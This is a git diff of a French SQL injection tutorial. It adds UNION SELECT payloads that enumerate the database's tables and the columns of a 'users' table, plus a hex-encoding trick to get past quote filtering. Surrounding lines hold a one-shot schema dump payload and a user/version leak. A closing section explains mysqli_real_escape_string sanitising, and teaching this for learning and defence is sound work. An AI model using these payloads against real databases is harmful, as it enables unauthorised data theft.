@@ -176,6 +176,8 @@ On peut aussi utiliser la commande ``GROUP BY``. Elle est utilisée pour grouper
 (SELECT export_set(5,@:=0,(SELECT count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
 ```
 <br/><br/>
+![image](https://user-images.githubusercontent.com/74382279/159718662-cfeb07b5-a53f-42b4-87d4-bea8b6cde76b.png)
+<br/><br/>
 Si on formatte la requête ça donne ça:<br/>
 ![image](https://user-images.githubusercontent.com/74382279/159136320-3bdbb668-65bc-4d2b-9354-0f686ef566b1.png)
 <br/>
@@ -185,6 +187,19 @@ UNION SELECT NULL,CONCAT_WS(" | ",user(),version(),database())--+-
 ```
 <br/><br/>
 ![image](https://user-images.githubusercontent.com/74382279/159135842-efa9684e-24e5-4299-b907-2498353465d2.png)
+<br/><br/>
+• Et là c'est le moment où je vais bâcler ce paper car j'ai la flemme de faire 42 recherches pour vous expliquer des trucs accessibles.
+• Pour extraire les tables de la BDD je fais: 
+```sql
+UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database();
+```
+<br/><br/>
+![image](https://user-images.githubusercontent.com/74382279/159717928-abf0cc62-6eb9-40cd-9482-50c50db8049f.png)
+• Pour récupérer les colonnes de la table users je fais:
+```sql
+UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users';
+```
+• Si ``'`` est filtré vous pouvez encoder users en hex et past le résultat avec le préfixe ``0x``.
 
 # Eviter
 • Le paramètre id est sanitized par ``mysqli_real_escape_string()``. Dans son style procédural cette fonction est utilisée pour créer une chaîne SQL valide qui pourra être utilisée dans une requête SQL. La chaîne de caractères string est encodée pour produire une chaîne ``SQL escaped``, en tenant compte du jeu de caractères courant de la connexion.<br/><br/>
